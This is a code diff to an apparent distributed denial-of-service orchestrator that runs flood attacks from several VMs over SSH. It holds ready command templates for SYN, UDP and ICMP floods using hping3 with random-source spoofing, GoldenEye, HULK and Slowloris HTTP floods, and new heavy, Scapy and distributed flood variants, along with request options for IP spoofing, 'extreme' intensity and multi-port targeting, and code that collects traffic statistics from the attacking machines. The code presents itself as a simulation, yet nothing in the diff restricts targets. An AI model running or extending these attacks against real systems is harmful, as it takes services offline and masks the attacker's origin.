@@ -109,31 +109,66 @@ ATTACK_TOOLS = {
         "name": "SYN Flood",
         "command": "sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target}",
         "requires_sudo": True,
+        "intensity_scaling": True,
+        "supports_statistics": True,
     },
     "udp_flood": {
         "name": "UDP Flood",
         "command": "sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target}",
         "requires_sudo": True,
+        "intensity_scaling": True,
+        "supports_statistics": True,
     },
     "http_flood": {
         "name": "HTTP Flood (GoldenEye)",
         "command": "cd /opt/GoldenEye && timeout {duration} python3 goldeneye.py http://{target}:{port} -w {workers} -s {sockets}",
         "requires_sudo": False,
+        "intensity_scaling": True,
+        "supports_statistics": True,
     },
     "slowloris": {
         "name": "Slowloris",
         "command": "timeout {duration} slowloris -s {sockets} -p {port} {target}",
         "requires_sudo": False,
+        "intensity_scaling": True,
+        "supports_statistics": True,
     },
     "icmp_flood": {
         "name": "ICMP Flood",
         "command": "sudo timeout {duration} hping3 --icmp --flood {target}",
         "requires_sudo": True,
+        "intensity_scaling": True,
+        "supports_statistics": True,
     },
     "hulk": {
         "name": "HULK HTTP Flood",
         "command": "cd /opt/hulk && timeout {duration} python3 hulk.py http://{target}:{port}",
         "requires_sudo": False,
+        "intensity_scaling": True,
+        "supports_statistics": True,
+    },
+    # New attack types from ddos_simulation
+    "hping_heavy": {
+        "name": "HPING Heavy Attack",
+        "command": "sudo timeout {duration} hping3 -S -p {port} --fast -c 100000 {target}",
+        "requires_sudo": True,
+        "intensity_scaling": True,
+        "supports_statistics": True,
+    },
+    "scapy_flood": {
+        "name": "Scapy Custom Flood",
+        "command": "cd /opt/scapy-tools && timeout {duration} python3 custom_flood.py --target {target} --port {port} --workers {workers}",
+        "requires_sudo": False,
+        "intensity_scaling": True,
+        "supports_statistics": True,
+    },
+    "distributed_http": {
+        "name": "Distributed HTTP Flood",
+        "command": "cd /opt/GoldenEye && timeout {duration} python3 goldeneye.py http://{target}:{port} -w {workers} -s {sockets} --distributed",
+        "requires_sudo": False,
+        "intensity_scaling": True,
+        "supports_statistics": True,
+        "distributed_only": True,
     },
 }
 
@@ -160,6 +195,17 @@ class AttackExecution:
     results: Dict[str, Any] = field(default_factory=dict)
     packets_sent: int = 0
     bytes_sent: int = 0
+    # Enhanced statistics from ddos_simulation
+    requests_per_second: float = 0.0
+    response_codes: Dict[str, int] = field(default_factory=dict)
+    connection_success_rate: float = 0.0
+    average_response_time: float = 0.0
+    error_count: int = 0
+    bandwidth_used: float = 0.0  # Mbps
+    concurrent_connections: int = 0
+    attack_intensity: str = "medium"  # low, medium, high, extreme
+    distributed_coordination: bool = False
+    vm_coordination_status: Dict[str, str] = field(default_factory=dict)
 
 
 class AttackRequest(BaseModel):
@@ -173,6 +219,14 @@ class AttackRequest(BaseModel):
     sockets: int = 100
     enable_ip_spoofing: bool = False
     spoofed_ips: Optional[List[str]] = None
+    # Enhanced parameters from ddos_simulation
+    attack_intensity: str = "medium"  # low, medium, high, extreme
+    enable_distributed_coordination: bool = True
+    packet_size: int = 1024  # bytes
+    enable_statistics_collection: bool = True
+    multi_port_targeting: Optional[List[int]] = None
+    custom_headers: Optional[Dict[str, str]] = None
+    enable_randomization: bool = True
 
 
 class IPSpoofingRequest(BaseModel):
@@ -444,18 +498,126 @@ class AttackOrchestrator:
             duration + 60
         )
 
+        # Collect enhanced statistics during attack execution
+        if result["success"]:
+            try:
+                # Start statistics collection in background
+                stats_task = asyncio.create_task(
+                    self.collect_attack_statistics(attack_id, source_vm_ip, attack_type, target_ip, target_port)
+                )
+
+                # Send periodic progress updates
+                for i in range(0, duration, 30):  # Every 30 seconds
+                    if i < duration:
+                        await asyncio.sleep(min(30, duration - i))
+                        progress = min((i + 30) / duration * 100, 100)
+                        await self.broadcast_to_attack(attack_id, {
+                            "type": "progress",
+                            "source": source_vm_ip,
+                            "progress": progress,
+                            "message": f"⚡ Attack in progress: {progress:.1f}% complete",
+                            "timestamp": datetime.now().isoformat()
+                        })
+
+                # Get final statistics
+                final_stats = await stats_task
+                result["statistics"] = final_stats
+
+            except Exception as e:
+                logger.error(f"Error during statistics collection: {e}")
+                result["statistics"] = {}
+
         # Send completion message
         status = "✅ completed" if result["success"] else "❌ failed"
-        await self.broadcast_to_attack(attack_id, {
+        completion_message = {
             "type": "log",
             "source": source_vm_ip,
             "message": f"{status}: {tool['name']} attack finished (exit code: {result['exit_code']})",
             "timestamp": datetime.now().isoformat(),
             "stdout": result["stdout"][-2000:] if result["stdout"] else "",  # Last 2000 chars
             "stderr": result["stderr"][-1000:] if result["stderr"] else ""
-        })
+        }
+
+        # Add statistics to completion message if available
+        if "statistics" in result and result["statistics"]:
+            stats = result["statistics"]
+            completion_message["statistics"] = {
+                "packets_sent": stats.get("packets_sent", 0),
+                "bytes_sent": stats.get("bytes_sent", 0),
+                "requests_per_second": stats.get("requests_per_second", 0),
+                "bandwidth_used": stats.get("bandwidth_used", 0),
+                "concurrent_connections": stats.get("concurrent_connections", 0)
+            }
+
+        await self.broadcast_to_attack(attack_id, completion_message)
 
         return result
+
+    async def collect_attack_statistics(self, attack_id: str, source_vm_ip: str,
+                                       attack_type: str, target_ip: str, target_port: int) -> Dict[str, Any]:
+        """Collect enhanced statistics from attack execution"""
+
+        stats = {
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "requests_per_second": 0.0,
+            "response_codes": {},
+            "connection_success_rate": 0.0,
+            "average_response_time": 0.0,
+            "error_count": 0,
+            "bandwidth_used": 0.0,
+            "concurrent_connections": 0
+        }
+
+        try:
+            # Collect network statistics using ss command
+            ss_cmd = f"ss -tuln | grep :{target_port} | wc -l"
+            ss_result = await asyncio.get_event_loop().run_in_executor(
+                ssh_executor, SSHExecutor.execute_command, source_vm_ip, ss_cmd, 10
+            )
+            if ss_result["success"]:
+                stats["concurrent_connections"] = int(ss_result["stdout"].strip() or 0)
+
+            # Collect network interface statistics
+            if_stats_cmd = f"cat /proc/net/dev | grep -E '(eth0|ens|enp)' | head -1"
+            if_result = await asyncio.get_event_loop().run_in_executor(
+                ssh_executor, SSHExecutor.execute_command, source_vm_ip, if_stats_cmd, 10
+            )
+
+            if if_result["success"] and if_result["stdout"]:
+                # Parse network interface stats for bytes sent
+                parts = if_result["stdout"].split()
+                if len(parts) >= 9:
+                    stats["bytes_sent"] = int(parts[9])  # TX bytes
+                    stats["packets_sent"] = int(parts[1])  # TX packets
+
+            # Calculate bandwidth usage (rough estimate)
+            if stats["bytes_sent"] > 0:
+                stats["bandwidth_used"] = (stats["bytes_sent"] * 8) / (1024 * 1024)  # Mbps
+
+            # For HTTP-based attacks, collect additional metrics
+            if attack_type in ["http_flood", "hulk", "distributed_http"]:
+                # Check for GoldenEye/HULK output logs
+                log_cmd = f"grep -o 'hits' /tmp/ddos_{attack_type}_{attack_id[:8]}.log 2>/dev/null | wc -l"
+                log_result = await asyncio.get_event_loop().run_in_executor(
+                    ssh_executor, SSHExecutor.execute_command, source_vm_ip, log_cmd, 10
+                )
+                if log_result["success"]:
+                    hits = int(log_result["stdout"].strip() or 0)
+                    stats["requests_per_second"] = hits / 60.0 if hits > 0 else 0.0
+
+            # Send statistics update via WebSocket
+            await self.broadcast_to_attack(attack_id, {
+                "type": "statistics",
+                "source": source_vm_ip,
+                "stats": stats,
+                "timestamp": datetime.now().isoformat()
+            })
+
+        except Exception as e:
+            logger.error(f"Error collecting statistics from {source_vm_ip}: {e}")
+
+        return stats
 
     async def run_distributed_attack(self, request: AttackRequest) -> str:
         """Run a distributed attack from multiple VMs"""
